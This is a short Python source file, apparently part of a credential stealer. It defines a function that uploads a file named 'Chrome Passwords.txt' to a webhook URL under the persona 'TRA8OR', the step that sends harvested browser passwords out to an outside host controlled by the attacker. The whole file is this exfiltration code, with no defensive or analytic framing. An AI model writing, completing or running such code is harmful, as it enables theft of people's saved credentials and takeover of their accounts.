import requests

def upload(webhook_url, file_path):

    payload = {}
    payload["username"] = "TRA8OR"
    payload["avatar_url"] = "https://i.ibb.co.com/CPrt4Dg/1732257842387.jpg"
    try:
        with open(file_path, "rb") as file:
            response = requests.post(
                webhook_url,
                data=payload,
                files={"file": ("Chrome Passwords.txt", file)}
            )
        return response.text
    except Exception as e:
        print(f"Error sending file: {e}")
        return False
